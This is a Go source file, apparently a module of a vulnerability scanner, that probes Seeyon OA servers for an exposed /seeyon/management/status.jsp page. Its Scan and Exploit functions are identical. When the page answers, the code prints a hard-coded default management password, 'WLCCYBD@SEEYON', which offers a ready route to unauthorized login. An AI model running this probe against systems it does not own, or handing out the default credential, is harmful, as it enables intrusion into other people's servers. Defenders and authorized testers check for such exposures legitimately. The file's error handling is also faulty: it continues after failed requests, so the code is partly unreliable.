package vulners

import (
	"github.com/fatih/color"
	"net/http"
)

type Sy12 struct {
}

func (s *Sy12) Scan(targetUrl string) {
	scancorePayload := "/seeyon/management/status.jsp"
	req, err := http.NewRequest("GET", targetUrl+scancorePayload, nil)
	if err != nil {
		color.Red("[x]请求异常！")
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		color.Red("[x]漏洞探测异常！")
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		color.Green("[+]存在status.jsp路径（密码：WLCCYBD@SEEYON）")
	} else {
		color.White("[-]不存在status.jsp路径")
	}
}
func (s *Sy12) Exploit(targetUrl string) {
	scancorePayload := "/seeyon/management/status.jsp"
	req, err := http.NewRequest("GET", targetUrl+scancorePayload, nil)
	if err != nil {
		color.Red("[x]漏洞探测异常！")
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		color.Red("[x]漏洞探测异常！")
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		color.Green("[+]存在status.jsp路径（密码：WLCCYBD@SEEYON）")
	} else {
		color.White("[-]不存在status.jsp路径")
	}
}
